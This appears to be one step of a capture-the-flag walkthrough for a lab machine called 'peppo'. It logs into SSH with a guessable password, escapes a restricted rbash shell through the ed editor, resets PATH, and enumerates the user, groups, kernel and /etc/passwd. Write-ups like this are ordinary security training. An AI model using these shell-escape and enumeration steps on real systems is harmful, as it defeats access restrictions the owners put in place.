# 6 :22 ssh eleanor

```
$ ssh eleanor@192.168.197.60
eleanor@192.168.197.60's password: eleanor

eleanor@peppo:~$ whoami
-rbash: whoami: command not found

# escape rbash
# -t "bash --noprofile" didnt work

Using https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
eleanor@peppo:~$ ed
!'/bin/bash'

# need to update PATH
eleanor@peppo:~$ export PATH=/bin:/usr/bin:$PATH

eleanor@peppo:~$ whoami;id;hostname;uname -a
eleanor
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
peppo
Linux peppo 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux

eleanor@peppo:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[truncated]
eleanor:x:1000:1000:eleanor,,,:/home/eleanor:/bin/rbash
```
